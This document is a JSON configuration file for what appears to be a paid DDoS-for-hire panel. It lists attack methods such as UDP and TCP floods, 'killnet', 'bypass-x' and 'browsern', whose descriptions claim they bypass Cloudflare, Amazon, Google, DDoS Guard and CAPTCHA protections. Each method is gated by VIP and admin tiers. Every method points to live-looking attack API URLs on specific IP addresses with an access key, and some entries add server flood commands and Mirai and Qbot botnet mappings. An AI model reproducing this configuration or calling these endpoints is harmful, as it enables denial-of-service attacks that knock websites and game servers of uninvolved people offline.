[
	{
		"name":"udp",
		"time":86000,
		"description":"High Gbps UDP Traffic Attack Targeting Open Ports (Only Admin)",
		"group":"High Gbps UDP Traffic Attack Targeting Open Ports (Only Admin)",
		"default port":53,
		"default time":120,
		"permission":["admin"],
		"api":[
			"http://143.198.197.41:2216/api/attack?key=zoxx&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=udp",
			"http://152.42.206.78:2216/api/attack?key=zoxx&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=udp",
			"http://143.198.158.153:2216/api/attack?key=zoxx&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=udp",
			"http://152.42.213.212:2216/api/attack?key=zoxx&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=udp",
		    "http://134.209.105.234:2216/api/attack?key=zoxx&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=udp",
		    "http://165.22.99.94:2216/api/attack?key=zoxx&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=udp",
		    "http://167.172.89.113:2216/api/attack?key=zoxx&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=udp"
			
		],
		"server":[
			{
				"name":"udp",
				"command":"./udp <<$host>> <<$port>> 3 <<$time>>"
			},
			{
				"name":"udp",
				"command":"./udp <<$host>> <<$port>> 3 <<$time>>"
			}
		],
		"botnet":{
			"qbot":"udp",
			"mirai":"udp"
		}
	},
	{
		"name":"tcp",
		"time":86000,
		"description":"Attack Ip Website Or Ip game (Max 120s)",
		"permission":["vip", "vvip", "admin"],
		"api":[
            "http://143.198.197.41:2216/api/attack?key=zoxx&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=tcp",
			"http://152.42.206.78:2216/api/attack?key=zoxx&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=tcp",
			"http://143.198.158.153:2216/api/attack?key=zoxx&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=tcp",
			"http://152.42.213.212:2216/api/attack?key=zoxx&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=tcp",
			"http://134.209.105.234:2216/api/attack?key=zoxx&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=tcp",
			"http://165.22.99.94:2216/api/attack?key=zoxx&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=tcp",
			"http://167.172.89.113:2216/api/attack?key=zoxx&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=tcp"
		]
    },
    {
		"name":"killnet",
		"time":86000,
		"description":"High R/s And Cloudflare, Google llc, Amazon",
		"permission":["vip", "vvip", "admin"],
		"api":[
            "http://143.198.197.41:2216/api/attack?key=zoxx&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=killnet",
            "http://152.42.206.78:2216/api/attack?key=zoxx&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=killnet",
            "http://143.198.158.153:2216/api/attack?key=zoxx&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=killnet",
            "http://152.42.213.212:2216/api/attack?key=zoxx&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=killnet",
            "http://134.209.105.234:2216/api/attack?key=zoxx&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=kill",
            "http://165.22.99.94:2216/api/attack?key=zoxx&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=killnet",
            "http://167.172.89.113:2216/api/attack?key=zoxx&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=killnet"
          ]
    },
    {
		"name":"bypass-x",
		"time":86000,
		"description":"High R/s And Cloudflare, Google llc, Amazon",
		"permission":["vip", "vvip", "admin"],
		"api":[
            "http://143.198.197.41:2216/api/attack?key=zoxx&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=bypass-x",
            "http://152.42.206.78:2216/api/attack?key=zoxx&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=bypass-x",
            "http://143.198.158.153:2216/api/attack?key=zoxx&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=bypass-x",
            "http://152.42.213.212:2216/api/attack?key=zoxx&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=bypass-x",
            "http://134.209.105.234:2216/api/attack?key=zoxx&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=bypass-x",
            "http://165.22.99.94:2216/api/attack?key=zoxx&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=bypass-x",
            "http://167.172.89.113:2216/api/attack?key=zoxx&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=bypass-x"
          ]
      },
     {
		"name":"h2-mix",
		"time":86000,
		"description":"High R/s And Cloudflare, Google llc, Amazon",
		"permission":["vip", "vvip", "admin"],
		"api":[
            "http://143.198.197.41:2216/api/attack?key=zoxx&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=h2-mix",
            "http://152.42.206.78:2216/api/attack?key=zoxx&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=h2-mix",
            "http://143.198.158.153:2216/api/attack?key=zoxx&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=h2-mix",
            "http://152.42.213.212:2216/api/attack?key=zoxx&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=h2-mix",
            "http://134.209.105.234:2216/api/attack?key=zoxx&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=h2-mix",
            "http://165.22.99.94:2216/api/attack?key=zoxx&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=h2-mix",
            "http://167.172.89.113:2216/api/attack?key=zoxx&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=h2-mix"
            ]
        },
        {
		"name":"https",
		"time":86000,
		"description":"High R/s And Cloudflare, Google llc, Amazon",
		"permission":["vip", "vvip", "admin"],
		"api":[
            "http://143.198.197.41:2216/api/attack?key=zoxx&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=https",
            "http://152.42.206.78:2216/api/attack?key=zoxx&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=https",
            "http://143.198.158.153:2216/api/attack?key=zoxx&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=https",
            "http://152.42.213.212:2216/api/attack?key=zoxx&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=https",
            "http://134.209.105.234:2216/api/attack?key=zoxx&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=https",
            "http://165.22.99.94:2216/api/attack?key=zoxx&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=https",
            "http://167.172.89.113:2216/api/attack?key=zoxx&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=https"
		]
    },
	{
		"name":"tls",
		"time":86000,
		"description":"High R/s And Cloudflare, Google llc, Amazon",
		"permission":["vip", "vvip", "admin"],
		"api":[
            "http://143.198.197.41:2216/api/attack?key=zoxx&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=tls",
            "http://152.42.206.78:2216/api/attack?key=zoxx&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=tls",
            "http://143.198.158.153:2216/api/attack?key=zoxx&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=tls",
            "http://152.42.213.212:2216/api/attack?key=zoxx&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=tls",
            "http://134.209.105.234:2216/api/attack?key=zoxx&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=tls",
            "http://165.22.99.94:2216/api/attack?key=zoxx&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=tls",
            "http://167.172.89.113:2216/api/attack?key=zoxx&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=tls"
		]
    },
    {
		"name":"x-hit",
		"time":86000,
		"description":"Hard Website And 0 Http DDoS",
		"permission":["vvip", "admin"],
		"api":[
			"http://143.198.197.41:2216/api/attack?key=zoxx&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=x-hit",
			"http://152.42.206.78:2216/api/attack?key=zoxx&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=x-hit",
			"http://143.198.158.153:2216/api/attack?key=zoxx&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=x-hit",
			"http://152.42.213.212:2216/api/attack?key=zoxx&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=x-hit",
			"http://134.209.105.234:2216/api/attack?key=zoxx&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=x-hit",
			"http://165.22.99.94:2216/api/attack?key=zoxx&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=x-hit",
			"http://167.172.89.113:2216/api/attack?key=zoxx&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=x-hit"
		]
	},
	{
		"name":"bypass",
		"time":86000,
		"description":"Cloudflare Inc, Google llc, Amazon,",
		"permission":["vip", "vvip", "admin"],
		"api":[
			"http://143.198.197.41:2216/api/attack?key=zoxx&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=bypass",
			"http://152.42.206.78:2216/api/attack?key=zoxx&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=bypass",
			"http://143.198.158.153:2216/api/attack?key=zoxx&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=bypass",
			"http://152.42.213.212:2216/api/attack?key=zoxx&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=bypass",
			"http://134.209.105.234:2216/api/attack?key=zoxx&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=bypass",
			"http://165.22.99.94:2216/api/attack?key=zoxx&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=bypass",
			"http://167.172.89.113:2216/api/attack?key=zoxx&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=bypass"
		]
    },
    {
		"name":"browsern",
		"time":86000,
		"description":"Bypassing Captcha, Uam, Captcha Turnstile",
		"permission":["vvip","admin"],
		"api":[
			"http://143.198.197.41:2216/api/attack?key=zoxx&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=browsern",
			"http://152.42.206.78:2216/api/attack?key=zoxx&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=browsern",
			"http://143.198.158.153:2216/api/attack?key=zoxx&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=browsern",
			"http://152.42.213.212:2216/api/attack?key=zoxx&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=browsern",
			"http://134.209.105.234:2216/api/attack?key=zoxx&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=browsern",
			"http://165.22.99.94:2216/api/attack?key=zoxx&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=browsern",
			"http://167.172.89.113:2216/api/attack?key=zoxx&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=browsern"
		]
    },
    {
		"name":"tcp-pps",
		"time":86000,
		"description":"Attack Ip Game ",
		"permission":["vip", "vvip", "admin"],
		"api":[
			"http://143.198.197.41:2216/api/attack?key=zoxx&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=tcp-pps",
			"http://152.42.206.78:2216/api/attack?key=zoxx&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=tcp-pps",
			"http://143.198.158.153:2216/api/attack?key=zoxx&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=tcp-pps",
			"http://152.42.213.212:2216/api/attack?key=zoxx&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=tcp-pps",
			"http://134.209.105.234:2216/api/attack?key=zoxx&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=tcp-pps",
			"http://165.22.99.94:2216/api/attack?key=zoxx&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=tcp-pps",
			"http://167.172.89.113:2216/api/attack?key=zoxx&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=tcp-pps"
		]
	},
    {
		"name":"x-bfull",
		"time":86000,
		"description":"Bypassing Cloudflare Inc, Amazon, Google Llc, DDoS Guard",
		"permission":["vvip", "admin"],
		"api":[
			"http://159.65.9.95:2216/api/attack?key=zoxx&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=x-bfull",
			"http://178.128.20.37:2216/api/attack?key=zoxx&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=x-bfull"
		]
    },
    {
		"name":"c-f",
		"time":86000,
		"description":"hard website And Fast Down",
		"permission":["vip", "vvip", "admin"],
		"api":[
			"http://143.198.197.41:2216/api/attack?key=zoxx&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=c-f",
			"http://152.42.206.78:2216/api/attack?key=zoxx&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=c-f",
			"http://143.198.158.153:2216/api/attack?key=zoxx&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=c-f",
			"http://152.42.213.212:2216/api/attack?key=zoxx&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=c-f",
			"http://134.209.105.234:2216/api/attack?key=zoxx&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=c-f",
			"http://165.22.99.94:2216/api/attack?key=zoxx&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=c-f",
			"http://167.172.89.113:2216/api/attack?key=zoxx&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=c-f"
		]
	},
	{
		"name":"bigddos",
		"time":2111,
		"description":"hacker",
		"permission":[],
        "botnet":{
            "mirai":"up"
        }

	}
]